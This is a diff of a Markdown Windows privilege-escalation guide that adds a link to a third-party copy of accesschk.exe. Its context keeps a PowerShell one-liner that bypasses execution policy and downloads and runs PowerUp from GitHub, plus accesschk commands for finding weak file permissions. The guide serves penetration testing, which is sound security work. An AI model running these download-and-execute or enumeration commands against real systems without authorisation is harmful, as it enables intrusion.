@@ -230,7 +230,7 @@ Search for weak services using [PowerUp Power Shell](https://raw.githubuserconte
 powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 ```
 ### Weak File Permissions
-We can also use `accesschk.exe` to determine which files in the target system have weak permissions like so,
+We can also use `accesschk.exe` to determine which files in the target system have weak permissions. You can get Accesschk.exe from [this repository](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/windows-binaries/accesschk.exe)
 ```
 C:> accesschk.exe -uwdqs Users c:\
 C:> accesschk.exe -uwdqs "Authenticated Users" c:\
